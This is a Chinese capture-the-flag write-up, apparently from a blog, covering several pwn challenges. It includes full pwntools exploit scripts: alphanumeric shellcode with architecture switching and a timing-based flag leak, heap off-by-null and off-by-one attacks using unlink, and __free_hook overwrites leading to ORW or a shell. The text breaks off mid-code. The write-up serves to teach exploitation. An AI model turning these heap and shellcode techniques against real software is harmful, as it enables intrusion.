123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180#-*- coding:utf8 -*-from pwn import *code_append = asm(&#x27;&#x27;&#x27; push rcx pop rcx&#x27;&#x27;&#x27;, arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;)code_append_x86 = asm(&#x27;&#x27;&#x27; push ebx pop ebx&#x27;&#x27;&#x27;, arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;)code_mmap = asm(&#x27;&#x27;&#x27; /*mov rdi, 0x40404040*/ push 0x40404040 pop rdi /*mov rsi, 0x7e*/ push 0x7e pop rsi /*mov rdx, 0x7*/ push 0x37 pop rax xor al, 0x30 push rax pop rdx /*mov r8, 0*/ push 0x30 pop rax xor al, 0x30 push rax pop r8 /*mov r9, 0*/ push rax pop r9 /*syscall*/ push 0x5e pop rcx xor byte ptr [rbx+0x2c], cl push 0x5c pop rcx xor byte ptr [rbx+0x2d], cl /*mov rax, 0x9*/ push 0x39 pop rax xor al, 0x30&#x27;&#x27;&#x27;, arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;)code_read = asm(&#x27;&#x27;&#x27; /*mov rsi, 0x40404040*/ push 0x40404040 pop rsi /*mov rdi, 0*/ push 0x30 pop rax xor al, 0x30 push rax pop rdi /*mov rdx, 0x7e*/ push 0x7e pop rdx /*mov rax, 0*/ push 0x30 pop rax xor al, 0x30 /*syscall*/ push 0x5e pop rcx xor byte ptr [rbx+0x4f], cl push 0x5c pop rcx xor byte ptr [rbx+0x50], cl&#x27;&#x27;&#x27;, arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;)code_retfq = asm(&#x27;&#x27;&#x27; /* 算出0x48 */ push 0x39 pop rcx xor byte ptr [rbx + 0x71], cl push 0x20 pop rcx xor byte ptr [rbx + 0x71], cl /* 利用无借位减法算出0xcb */ push 0x47 pop rcx sub byte ptr [rbx + 0x72], cl sub byte ptr [rbx + 0x72], cl push rdi push rdi push 0x23 push 0x40404040 pop rax push rax&#x27;&#x27;&#x27;, arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;)code_open = asm(&#x27;&#x27;&#x27; /* open函数 */ mov esp, 0x40404550 push 0x67616c66 /* flag */ mov ebx, esp xor ecx, ecx xor edx, edx mov eax, 0x5 int 0x80 mov ecx, eax&#x27;&#x27;&#x27;, arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;)code_retfq_back = asm(&#x27;&#x27;&#x27; /* retfq */ push 0x33 push 0x40404064 /* 具体数字有待修改 */ retfq&#x27;&#x27;&#x27;, arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;)shellcode_read_flag = asm(&#x27;&#x27;&#x27; /*read(fp,buf,0x70)*/ mov rdi,rcx mov rsi,rsp mov rdx,0x70 xor rax,rax syscall&#x27;&#x27;&#x27;, arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;)def pwn(sh, index, ch): shellcode = &#x27;&#x27; shellcode += code_mmap shellcode += code_append shellcode += code_read shellcode += code_append shellcode += code_retfq shellcode += code_append sh.sendline(shellcode) shellcode2 = &#x27;&#x27; shellcode2 += code_open shellcode2 += code_append shellcode2 += code_retfq_back shellcode2 += shellcode_read_flag if index == 0: shellcode2 += asm(&quot;cmp byte ptr[rsi+&#123;0&#125;], &#123;1&#125;; jz $-3; ret&quot;.format(index, ch), arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;) else: shellcode2 += asm(&quot;cmp byte ptr[rsi+&#123;0&#125;], &#123;1&#125;; jz $-4; ret&quot;.format(index, ch), arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;) sh.sendline(shellcode2)index = 0t = []while True: for ch in range(0x20, 0x7f): # sh = remote(&#x27;39.105.137.118&#x27;, 50050) sh = process(&#x27;./shellcode&#x27;) pwn(sh, index, ch) start = time.time() try: sh.recv(timeout=2) except: pass end = time.time() sh.close() if end - start &gt; 1.5: t.append(ch) print(&quot;&quot;.join([chr(i) for i in t])) break else: print(&quot;&quot;.join([chr(i) for i in t])) break index = index + 1 print(t)log.success(&quot;&quot;.join([chr(i) for i in t])) 这道题我后来想再切到32位进行write调用，后来发现是我看错了=-=。这里当调用号为4的时候，返回的是kill，所以我怎么样都没有办法获得输出： 10003: 0x15 0x03 0x00 0x00000004 if (A == stat) goto 0007 不过呢，经过调试也是有一定的收获的： 遇到不能执行的系统调用，gdb会返回： 12Program terminated with signal SIGSYS, Bad system call.The program no longer exists. 在调试的过程中，切到32位但是gdb并不会显示正确，如下所示32位架构下，eax为4，系统调用应该为SYS_write，但是gdb还是显示的是SYS_stat，可能这和gdb的版本有关系吧。 12345670x4040407f mov ebx, 10x40404084 mov ecx, 0x4040454c0x40404089 mov edx, 0x200x4040408e mov eax, 40x40404093 int 0x80 &lt;SYS_stat&gt; file: 0x3 buf: 0x4040454c ◂— insb byte ptr [rdi], dx /* 0x3332317b67616c66; &#x27;flag&#123;123456&#125;\\n&#x27; */ 补充retfq切换到32位和write调用的shellcode： 123456789101112131415161718code_retfq2 = asm(&#x27;&#x27;&#x27; /* retfq */ push 0x23 push 0x4040407f retfq&#x27;&#x27;&#x27;, arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;)print(len(code_retfq2))# code_write = asm(shellcraft.write(1, 0x4040454c, 100), arch = &#x27;i386&#x27;)code_write = asm(&#x27;&#x27;&#x27; /* write */ mov ebx, 1 /* 文件描述符 */ mov ecx, 0x4040454c /* flag地址 */ mov edx, 0x20 /* 打印的数据长度 */ mov eax, 0x4 /* 系统调用号 */ int 0x80&#x27;&#x27;&#x27;, arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;) alpha3 我们也可以用alpha3项目来完成第一步： 1git clone https://github.com/TaQini/alpha3.git 首先生成shellcode： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546from pwn import * context.arch = &#x27;amd64&#x27;def f(sc): return asm(sc, os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;)code_read = f(&#x27;&#x27;&#x27;mov rsi, 0x40404040;pushw 0x1010;pop rdx;xor rdi, rdi;xor rax, rax;syscall;&#x27;&#x27;&#x27;)# mmap(0x40404040, 0xff, 7, 34, 0, 0) ax=9code_mmap = f(&#x27;&#x27;&#x27;mov rdi, 0x40404040;push 0x7f;pop rsi;push 7;pop rdx;push 34;pop rcx;xor r8, r8;xor r9, r9;push 9;pop rax;syscall;&#x27;&#x27;&#x27;)code_rsp = f(&#x27;&#x27;&#x27;mov rsp, 0x40404f40&#x27;&#x27;&#x27;)code_retfq = f(&#x27;&#x27;&#x27;push 0x23;push 0x40404040;retfq&#x27;&#x27;&#x27;)shellcode = code_mmap + code_read + code_rsp + code_retfqfp = open(&#x27;sc&#x27;, &#x27;wb&#x27;)fp.write(shellcode)fp.close() 然后使用alpha3生成可见字符（为什么是rbx呢，因为shellcode调用指令是call rbx）： 1python ALPHA3.py x64 ascii mixedcase rbx --input=&#x27;/home/secc/Desktop/sc&#x27; 1Sh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M153f3b0s2F0s2B0Z2l0l2L072I0X1P0i2w134l1M1m3k2F090o7m0L0x5o3g2p0p2I0r2q0Y2C2D060y1L8N2E124k7m0C0x3n3d2O0x2M0p2F2s2p0u2O0s2G0z5K00 这样我们第一次发送的payload就可以替换成以上字符串了。 babypwn 查看沙盒： 123456789101112131415secc@ubuntu:~/Desktop$ seccomp-tools dump ./babypwn 1.add2.delete3.edit4.show line CODE JT JF K================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x00 0x05 0xc000003e if (A != ARCH_X86_64) goto 0007 0002: 0x20 0x00 0x00 0x00000000 A = sys_number 0003: 0x35 0x00 0x01 0x40000000 if (A &lt; 0x40000000) goto 0005 0004: 0x15 0x00 0x02 0xffffffff if (A != 0xffffffff) goto 0007 0005: 0x15 0x01 0x00 0x0000003b if (A == execve) goto 0007 0006: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0007: 0x06 0x00 0x00 0x00000000 return KILL 打开IDA反编译程序： 1234567891011121314151617181920212223242526272829303132void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)&#123; int v3; // eax sub_C54(a1, a2, a3); while ( 1 ) &#123; while ( 1 ) &#123; puts(&quot;&gt;&gt;&gt; &quot;); v3 = sub_BEF(); if ( v3 != 2 ) break; sub_DD9(); &#125; if ( v3 &gt; 2 ) &#123; if ( v3 == 3 ) &#123; sub_EE3(); &#125; else if ( v3 == 4 ) &#123; sub_103A(); &#125; &#125; else if ( v3 == 1 ) &#123; sub_CDB(); &#125; &#125;&#125; add函数： 123456789101112131415161718192021&#123; int i; // [rsp+4h] [rbp-Ch] size_t size; // [rsp+8h] [rbp-8h] for ( i = 0; i &lt;= 16 &amp;&amp; (*((_QWORD *)&amp;unk_202060 + 2 * i) || qword_202068[2 * i]); ++i ) // 限制只能同时申请16个堆 ; if ( i == 17 ) &#123; puts(&quot;error&quot;); exit(0); &#125; puts(&quot;size:&quot;); size = (int)sub_BEF(); if ( size &gt; 0x200 ) &#123; puts(&quot;error&quot;); exit(0); &#125; *((_QWORD *)&amp;unk_202060 + 2 * i) = malloc(size); // 申请大小 qword_202068[2 * i] = size; return puts(&quot;done&quot;); edit函数： 12345678910111213141516int sub_EE3()&#123; unsigned __int64 v1; // [rsp+8h] [rbp-8h] puts(&quot;index:&quot;); v1 = (int)sub_BEF(); if ( v1 &gt; 0x10 || !*((_QWORD *)&amp;unk_202060 + 2 * v1) || !qword_202068[2 * v1] ) &#123; puts(&quot;error&quot;); exit(0); &#125; puts(&quot;content:&quot;); read(0, *((void **)&amp;unk_202060 + 2 * v1), qword_202068[2 * v1]); // 读入时没有截断，可能存在地址泄露 sub_EB1(*((_QWORD *)&amp;unk_202060 + 2 * v1)); // 这里就是检测函数 return puts(&quot;done&quot;);&#125; 跟进sub_EB1检测函数： 12345678910111213141516171819unsigned __int64 __fastcall sub_EB1(_BYTE *a1)&#123; unsigned __int64 result; // rax while ( 1 ) &#123; result = (unsigned __int8)*a1; if ( !(_BYTE)result ) break; if ( *a1 == 0x11 ) // 遇到0x11的时候，停止并将该字符替换为0 &#123; result = (unsigned __int64)a1; *a1 = 0; return result; &#125; ++a1; &#125; return result;&#125; show函数： 123456789101112131415int sub_103A()&#123; unsigned __int64 v1; // [rsp+8h] [rbp-8h] puts(&quot;index:&quot;); v1 = (int)sub_BEF(); if ( v1 &gt; 0x10 || !*((_QWORD *)&amp;unk_202060 + 2 * v1) || !qword_202068[2 * v1] ) &#123; puts(&quot;error&quot;); exit(0); &#125; sub_FCC(**((unsigned int **)&amp;unk_202060 + 2 * v1)); sub_FCC(*(unsigned int *)(*((_QWORD *)&amp;unk_202060 + 2 * v1) + 4LL)); return puts(&quot;done&quot;);&#125; 跟进sub_FCC函数，输出的时候会对内容进行异或操作： 1234567int __fastcall sub_FCC(unsigned int a1)&#123; int i; // [rsp+1Ch] [rbp-4h] for ( i = 2; i &gt; 0; --i ) a1 ^= (32 * a1) ^ ((a1 ^ (32 * a1)) &gt;&gt; 17) ^ (((32 * a1) ^ a1 ^ ((a1 ^ (32 * a1)) &gt;&gt; 17)) &lt;&lt; 13); return printf(&quot;%lx\\n&quot;, a1); free函数： 12345678910111213141516int sub_DD9()&#123; unsigned __int64 v1; // [rsp+8h] [rbp-8h] puts(&quot;index:&quot;); v1 = (int)sub_BEF(); if ( v1 &gt; 0x10 || !*((_QWORD *)&amp;unk_202060 + 2 * v1) || !qword_202068[2 * v1] ) &#123; puts(&quot;error&quot;); exit(0); &#125; free(*((void **)&amp;unk_202060 + 2 * v1)); *((_QWORD *)&amp;unk_202060 + 2 * v1) = 0LL; qword_202068[2 * v1] = 0LL; return puts(&quot;done&quot;);&#125; 思路： 申请一个0x200大小的堆块，这样它的header为0x211。通过sub_EB1检测函数中的替换功能，可以将堆块header头的\\x11替换为\\x00，这样就类似于off by null了。 使用z3解决输出的加密后，泄露libc和heap地址。 程序使用了沙盒，使用orw读取flag。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111from pwn import *context(log_level = &#x27;debug&#x27;, arch = &#x27;amd64&#x27;, endian = &#x27;little&#x27;)sh = process(&#x27;./babypwn&#x27;, env= &#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libseccomp.so.2&#x27;&#125;)libc = ELF(&#x27;./libc.so.6&#x27;)def db(): cmd = &#x27;&#x27;&#x27; init-pwndbg bpie 0xE69 bpie 0x10CB bpie 0xD90 bpie 0xF9A &#x27;&#x27;&#x27; gdb.attach(sh, cmd)from z3 import *def solve(target): a1 = BitVec(&#x27;a1&#x27;, 32) x = a1 for _ in range(2): x ^= (32 * x) ^ LShR((x ^ (32 * x)), 17) ^ (((32 * x) ^ x ^ LShR((x ^ (32 * x)), 17)) &lt;&lt; 13) s = Solver() s.add(x == target) assert s.check() == sat return (s.model()[a1].as_long())def add(size): sh.sendlineafter(&#x27;&gt;&gt;&gt;&#x27;, &#x27;1&#x27;) sh.sendlineafter(&#x27;size&#x27;, str(size))def free(idx): sh.sendlineafter(&#x27;&gt;&gt;&gt;&#x27;, &#x27;2&#x27;) sh.sendlineafter(&#x27;index&#x27;, str(idx))def edit(idx, content): sh.sendlineafter(&#x27;&gt;&gt;&gt;&#x27;, &#x27;3&#x27;) sh.sendlineafter(&#x27;index&#x27;, str(idx)) sh.sendafter(&#x27;content&#x27;, content)def show(idx): sh.sendlineafter(&#x27;&gt;&gt;&gt;&#x27;, &#x27;4&#x27;) sh.sendlineafter(&#x27;index&#x27;, str(idx)) sh.recvline() tmp1 = solve(int(sh.recvline(keepends = False), 16)) tmp2 = solve(int(sh.recvline(keepends = False), 16)) return (tmp2 &lt;&lt; 32) + tmp1[add(0x1f0) for i in range(2)][free(i) for i in range(2)][add(0x1f0) for i in range(7)]heapbase = show(0) - 0xcb0print(hex(heapbase))add(0x1f0)add(0x200)add(0x1f0)[free(i) for i in range(7)]free(7)add(0xa0) # 0libc.address = show(0) - 0x3ebe90print(hex(libc.address))add(0x148) # 1addr = heapbase + 0x1ab0edit(1, &#x27;a&#x27; * 0x148)edit(1, &#x27;a&#x27; * 0x140 + p64(0x150 + 0xa0))edit(0, p64(0) + p64(0x1f0) + p64(addr) * 2)edit(8, &#x27;a&#x27; * 0x1f0 + p64(0) + p64(0x211))free(8)free_hook = libc.sym[&#x27;__free_hook&#x27;]setcontext = libc.sym[&#x27;setcontext&#x27;] + 53mprotect = libc.sym[&#x27;mprotect&#x27;]add(0x120) # 2free(1)edit(2, &#x27;a&#x27; * 0xa0 + p64(free_hook))add(0x140) # 1add(0x140) # 3payload = flat(&#123;0x68: free_hook &amp; ~0xfff,0x70: 0x1000,0x88: 7,0xa0: free_hook + 0x18,0xa8: mprotect&#125;)edit(2, payload)orw = asm(&#x27;&#x27;&#x27;mov rax, 2mov rdi, &#123;flag&#125;mov rsi, 0syscallxor rax, raxmov rdi, 3mov rsi, &#123;bss&#125;mov rdx, 0x300syscallmov rax, 1mov rdi, 1mov rsi, &#123;bss&#125;mov rdx, 0x100syscall &#x27;&#x27;&#x27;.format(flag = free_hook + 0x8, bss = free_hook + 0x200))edit(3, p64(setcontext) + &#x27;./flag\\x00\\x00&#x27; + p64(0) + p64(free_hook + 0x20) + orw)free(2)sh.interactive() 注意点 这里由于free函数向后合并的时候需要检测nextinuse，所以伪造的下下个chunk的inuse位一定要为1，否则会进入unlink函数，并报错corrupted size vs. prev_size。 这里对应的是第69行的p64(0x211)。 123456 4302 /* consolidate forward */ 4303 if (!nextinuse) &#123;► 4304 unlink(av, nextchunk, bck, fwd); 4305 size += nextsize; 4306 &#125; else 4307 clear_inuse_bit_at_offset(nextchunk, 0); 使用unlink函数的时候，如果单纯想要制造堆块重叠，其实只需要将fd和bk设置为伪堆块的头部指针即可 ，这样*(FD -&gt; bk)= p和*(BK -&gt; fd)= p两个条件都满足。 在setcontext的过程中，我们要赋给esp的运行地址，且要压入mprotect的函数地址，如果需要在前面加上./flag\\x00\\x00字符串的话，需要空8个字节，否则字符串就会被mprotect的函数地址覆盖了。 setcontext我们已经遇到好几次了，发现不同师傅有不同的写法，实际上还可以这么写： 123456789sig = SigreturnFrame()sig.rsp = free_hook + 0x18# sig.rbp = sig.rspsig.rip = mprotectsig.rdi = free_hook &amp; ~0xfffsig.rsi = 0x1000sig.rdx = 7# sig.csgsfs = 0x2b000000000033edit(2, str(sig)) 使用gdb进行attach的函数真挺好用的： 123456789def db(): cmd = &#x27;&#x27;&#x27; init-pwndbg bpie 0xE69 bpie 0x10CB bpie 0xD90 bpie 0xF9A &#x27;&#x27;&#x27; gdb.attach(sh, cmd) babydiary 使用IDA反编译程序： 发现初始化函数可能存在花指令，将1268地址的数据修改为nop，再进行反编译，就可以看到初始化函数： 1234567891011121314unsigned int sub_1269()&#123; int i; // [rsp+Ch] [rbp-4h] setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stderr, 0LL, 2, 0LL); for ( i = 0; i &lt;= 24; ++i ) &#123; qword_4060[i] = 0LL; dword_4140[i] = 0; &#125; return alarm(0x78u);&#125; main函数： 123456789101112131415161718192021222324252627282930int sub_18BD()&#123; int result; // eax while ( 1 ) &#123; sub_1416(); result = sub_13C3(); if ( result == 4 ) return result; if ( result &gt; 4 ) goto LABEL_10; switch ( result ) &#123; case 3: sub_1814(); break; case 1: sub_169D(); break; case 2: sub_17A8(); break; default:LABEL_10: printf(&quot;wrong choice&quot;); break; &#125; &#125;&#125; add函数： 123456789101112131415161718192021void sub_169D()&#123; int i; // [rsp+4h] [rbp-Ch] int v1; // [rsp+8h] [rbp-8h] unsigned int v2; // [rsp+Ch] [rbp-4h] for ( i = 0; i &lt;= 24 &amp;&amp; qword_4060[i]; ++i ) ; if ( i &lt;= 24 ) &#123; printf(&quot;size: &quot;); v1 = sub_13C3(); qword_4060[i] = malloc(v1 + 1); // qword_4060存放地址 if ( qword_4060[i] ) &#123; printf(&quot;content: &quot;); v2 = sub_132B(qword_4060[i], v1, 10); // myread函数 sub_1528((unsigned int)i, v2); // 关键函数，这里传入了写入的字符个数v2 &#125; &#125;&#125; 跟进myread函数： 1234567891011121314151617__int64 __fastcall sub_132B(__int64 a1, int a2, char a3)&#123; unsigned int i; // [rsp+1Ch] [rbp-4h] for ( i = 0; (int)i &lt; a2; ++i ) &#123; if ( (int)read(0, (void *)((int)i + a1), 1uLL) &lt;= 0 ) &#123; puts(&quot;read error&quot;); exit(0); &#125; if ( a3 == *(_BYTE *)((int)i + a1) ) // 换行符 break; &#125; *(_BYTE *)((int)i + a1) = 0; // 多写一位，但是由于前面malloc的参数已经加1，所以这里没有溢出 return i;&#125; 跟进sub_1528关键函数，发现函数往输入的末位写入一位类似校验位的数据，这就造成了off by one漏洞，如果我们能够控制好输入的内容，就可以任意溢出一个字节，修改后一个chunk的size位： 123456789101112void __fastcall sub_1528(unsigned int a1, int a2)&#123; __int64 v2; // [rsp+10h] [rbp-8h] if ( a1 &lt;= 0x18 &amp;&amp; qword_4060[a1] ) &#123; v2 = qword_4060[a1]; dword_4140[a1] = a2; // dword_4140存放写入数量 if ( a2 ) *(_BYTE *)(a2 + 1LL + v2) = (*(_BYTE *)(a2 + 1LL + v2) &amp; 0xF0) + sub_146E(a1); &#125; // 末位的后一位进行重新赋值，off by one&#125; 跟进sub_146E函数： 1234567891011121314__int64 __fastcall sub_146E(unsigned int a1)&#123; int i; // [rsp+10h] [rbp-14h] unsigned int v3; // [rsp+14h] [rbp-10h] if ( a1 &gt; 0x18 || !qword_4060[a1] ) return 0xFFFFFFFFLL; v3 = 0; for ( i = 0; i &lt; dword_4140[a1]; ++i ) v3 += *(unsigned __int8 *)(i + qword_4060[a1]); // 取出堆块内容中的每一个int8 while ( v3 &gt; 0xF ) // 如果v3大于0xf v3 = (v3 &gt;&gt; 4) + (v3 &amp; 0xF); // 求出除以16的商和余数，求和 return v3;&#125; show函数： 123456789101112int sub_17A8()&#123; int result; // eax unsigned int v1; // [rsp+Ch] [rbp-4h] printf(&quot;index: &quot;); v1 = sub_13C3(); result = sub_15DF(v1) ^ 1; if ( !(_BYTE)result ) return printf(&quot;content: %s\\n&quot;, (const char *)qword_4060[v1]); return result;&#125; 跟进sub_15DF检测函数，该函数检测v2与计算出来的位之和共奇偶，就可以打印： 12345678910111213_BOOL8 __fastcall sub_15DF(signed int a1)&#123; char v2; // bl int v3; // [rsp+Ch] [rbp-14h] if ( a1 &gt; 24 || !qword_4060[a1] ) return 0LL; v3 = dword_4140[a1]; // 注意新建堆时必须要填入内容，否则检测函数会判断错误，并返回0 if ( !v3 ) return 0LL; v2 = *(_BYTE *)(v3 + 1LL + qword_4060[a1]); return ((v2 - (unsigned __int8)sub_146E(a1)) &amp; 1) == 0;&#125; free函数： 123456789101112131415161718192021int sub_1814()&#123; _DWORD *v0; // rax int v2; // [rsp+Ch] [rbp-4h] printf(&quot;index: &quot;); LODWORD(v0) = sub_13C3(); v2 = (int)v0; if ( (int)v0 &lt;= 24 ) &#123; v0 = (_DWORD *)qword_4060[(int)v0]; if ( v0 ) &#123; free((void *)qword_4060[v2]); qword_4060[v2] = 0LL; v0 = dword_4140; dword_4140[v2] = 0; // 并未清空堆空间内容 &#125; &#125; return (int)v0;&#125; 思路，存在off by one漏洞时，我们可以使用unlink函数进行攻击，下面看看如何绕过： 构造释放堆块前一个chunk的header 首先通过large bin残存的fd_nextsize和bk_nextsize来构造unlink的fd和bk指针。 申请一个large bin大小的chunk，首先释放成为unsorted bin，然后申请一个更大的chunk，这样unsorted bin就会进入large bin中，这时他的fd_nextsize和bk_nextsize指针指向的都是自己。 1234567891011121314# 释放后成为unsorted binpwndbg&gt; x/20gx 0x56171f2c93e00x56171f2ca010: 0x0000000000000000 0x00000000000013d10x56171f2ca020: 0x00007fcb749bdbe0 0x00007fcb749bdbe00x56171f2ca030: 0x0000000000000000 0x0000000000000000# 申请更大的chunk后，或者申请分割的chunk，堆块会先进入large bin，写入fd_nextsize和bk_nextsize两个指针，并同时指向堆块头部。# 进入large bin后被分割，仍会回到unsorted binpwndbg&gt; x/20gx 0x56171f2ca0100x56171f2ca010: 0x0000000000000000 0x00000000000000310x56171f2ca020: 0x0000000000000007 0x00000000000001010x56171f2ca030: 0x000056171f220008 0x000056171f2ca0100x56171f2ca040: 0x0000000000000000 0x00000000000013b10x56171f2ca050: 0x00007fcb749bdbe0 0x00007fcb749bdbe0 这时候修改fd指针为fd-8，不修改bk指针，这样FD -&gt; bk和BK -&gt; fd同时指向了0x56171f2ca020，并且需要在该地址存储自己的地址0x56171f2ca020，从而绕过unlink的检测。 这里要注意写入操作中会将地址的倒数第2个字节覆盖为\\x00，所以我们要保证上述的几个地址，包括0x56171f2ca020 - 0x18的倒数第2个字节的低位仍然为\\x0。 如何构造上述地址呢？我们构造两个fast bin，接连将其释放，这样0x56171f2ca020位置就会写入fd的指针，即前一个fast bin的地址，通过修改fast bin的指针来达成目的。 由于地址末位为0x20，所以只需要写入p8(0x20)即可，但是根据写入的规则，程序会将地址倒数第2个字节覆盖为\\x00，倒数第3个字节的低位覆盖为checksum校验位\\x2： 1234pwndbg&gt; x/20gx 0x56171f2ca0100x56171f2ca010: 0x0000000000000000 0x00000000000000310x56171f2ca020: 0x000056171f220020 0x00000000000001010x56171f2ca030: 0x000056171f220008 0x000056171f2ca010 由于上面写入fd的时候也会在倒数第二位覆盖为\\x00，倒数第3个字节的低位覆盖为checksum校验位，那么我们需要保证两个写入checksum的是相同的（这里都为\\x2）。这里通过修改上面的payload中add(0x20, p64(0x7) + p64(0x101) + p8(0x08)) # 9的无用数据p64(0x7)进行调整。 实际上除了倒数3位是相同的外，其余参数由于系统开启了PIE都是随机的，所以0x000056171f220020加粗的部分是需要爆破的，有1/256的可能性可以命中。 构造释放堆块的prev size和prev inuse位 首先通过内容全部写\\x00，将prev_inuse位覆盖为\\x0。 然后使用add(0x17, p64(0) + p64(1)) # 12将prev_size位覆盖为0x100，还是比较巧妙的。但导致prev_size只能写入0x100的倍数，所以我们前面的fackchunk的size位也要写成0x101。 注意要保证free这个chunk的时候会触发malloc_consolidate函数，所以要确保chunk大小在tcache范围之外，这里选择了0x500。 1234pwndbg&gt; x/20gx 0x55932b25c1200x55932b25c120: 0x0000000000000100 0x00000000000005100x55932b25c130: 0x00007f2d9b870061 0x00007f2d9b8a12100x55932b25c140: 0x000055932b25c120 0x000055932b25c120 构造释放堆块下个chunk的prev_inuse位 这里很简单，只需要申请一个chunk即可，为了后面的堆块重叠，我们选择将后面的free chunk全部申请掉。 脚本： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788from pwn import *context(endian = &#x27;little&#x27;, arch = &#x27;amd64&#x27;)libc = ELF(&#x27;./libc-2.31.so&#x27;)def db(): cmd = &#x27;&#x27;&#x27; init-pwndbg b malloc b free &#x27;&#x27;&#x27; gdb.attach(sh, cmd)def choice(cho): sh.sendlineafter(&#x27;&gt;&gt; &#x27;, str(cho))def add(size, content = &#x27;a&#x27;): choice(1) sh.sendlineafter(&#x27;size: &#x27;, str(size)) sh.sendlineafter(&#x27;content: &#x27;, content) v3 = 0 &#x27;&#x27;&#x27; for char in content: v3 += ord(char) while v3 &gt; 0xf: v3 = (v3 / 0x10) + (v3 % 0x10) print(content, hex(v3) &#x27;&#x27;&#x27;def show(idx): choice(2) sh.sendlineafter(&#x27;index: &#x27;, str(idx))def free(idx): choice(3) sh.sendlineafter(&#x27;index: &#x27;, str(idx))def pwn(): [add(0x20) for i in range(7)] # 0-6 add(0x2000) # 7 add(0x10) # 8 free(7) add(0x1000 - 0x3f0 + 0x10) # 7 add(0x20, p64(0x7) + p64(0x101) + p8(0x08)) # 9 add(0x20) # 10 [free(i) for i in range(7)] free(10) free(9) [add(0x20) for i in range(7)] # 0-6 add(0x20, p8(0x20)) # 9 add(0x100 - 0x30 * 2 - 0x20) # 10 add(0x17) # 11 free(11) add(0x500) # 11 add(0x17, p64(0) * 2 + p32(0) + p8(0) * 3) # 12 free(12) add(0x17, p64(0) + p64(1)) # 12 add(0xdb0) # 13 free(11) add(0x40) # 11 show(10) sh.recvuntil(&quot;content: &quot;) libc.address = u64(sh.recvuntil(&#x27;\\x7f&#x27;, timeout = 0.5).ljust(8, &#x27;\\x00&#x27;)) - 0x60 - 0x1ebb80 assert libc.address &amp; 0xfff == 0 print(hex(libc.address)) add(0x10) # 14 free(14) free(12) add(0x100, flat(&#123;0x68: 0x21, 0x70: libc.sym[&#x27;__free_hook&#x27;] - 8&#125;, filler = &#x27;\\x00&#x27;)) # 12 add(0x10) # 14 add(0x10, &#x27;/bin/sh\\x00&#x27; + p64(libc.sym[&#x27;system&#x27;])) # 15 free(15) sh.interactive()while True: sh = process(&quot;./baby_diary&quot;) try: pwn() except KeyboardInterrupt: break except: sh.close() pipeline 使用IDA反编译程序： 123456__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; ((void (__fastcall *)(__int64, char **, char **))((char *)&amp;sub_1288 + 1))(a1, a2, a3); sub_1921(); return 0LL;&#125; 跟进函数： 1234567891011121314void sub_1921()&#123; unsigned int v0; // [rsp+Ch] [rbp-4h] while ( 1 ) &#123; sub_14E1(); v0 = sub_1540(&quot;&gt;&gt; &quot;); if ( v0 &lt;= 6 ) break; printf(&quot;wrong choice&quot;); &#125; __asm &#123; jmp rax &#125;&#125; 后面的汇编代码IDA似乎解析得不全，我们来解析一下： 123456789.text:000000000000194C mov eax, [rbp+var_4].text:000000000000194F lea rdx, ds:0[rax*4] # rdx = 4 * rax.text:0000000000001957 lea rax, byte_20BC # 0xfffff8b4fffff8fa.text:000000000000195E mov eax, [rdx+rax] # 0xfffff8fa.text:0000000000001961 cdqe # 0xfffffffffffff8b4.text:0000000000001963 lea rdx, byte_20BC # rdx = $rebase(0x020BC).text:000000000000196A add rax, rdx # rax = $rebase(0x020BC - 0x74C) = $rebase(0x1970).text:000000000000196D db 3Eh.text:000000000000196D jmp rax 原理分析下来，byte_20BC数组类似于函数地址表，最后取得的rax为$rebase(0x1970)后的函数： add函数，发现malloc的结构体是一个链式结构： 1234567891011121314151617181920212223242526272829303132333435unsigned __int64 sub_15B5()&#123; unsigned __int64 result; // rax int v1; // [rsp+Ch] [rbp-14h] __int64 v2; // [rsp+10h] [rbp-10h] void *s; // [rsp+18h] [rbp-8h] s = sub_1391(24); // malloc函数，堆块大小0x18 memset(s, 0, 0x18uLL); if ( qword_4058 ) &#123; v1 = 1; // v1 = idx v2 = qword_4058; // v2 = memsize while ( *(_QWORD *)(v2 + 16) ) &#123; v2 = *(_QWORD *)(v2 + 16); ++v1; &#125; if ( v1 &lt;= 9 ) &#123; result = v2; *(_QWORD *)(v2 + 16) = s; // 在0x10的位置上填入下一个buff的地址，证明这是一个链式结构 &#125; else &#123; return sub_1422((unsigned __int64)s); // checkerr函数 &#125; &#125; else &#123; result = (unsigned __int64)s; qword_4058 = (__int64)s; &#125; return result;&#125; 新增结构体pipe： 1234567struct pipe&#123; char *malloc_addr; int offset; int size; struct pipe *next_ptr;&#125;; 映射v2为pipe结构体，去掉类型转换后，代码就清晰很多了： 1234567891011121314151617181920212223242526272829303132333435struct pipe *sub_15B5()&#123; struct pipe *result; // rax int v1; // [rsp+Ch] [rbp-14h] struct pipe *v2; // [rsp+10h] [rbp-10h] void *s; // [rsp+18h] [rbp-8h] s = 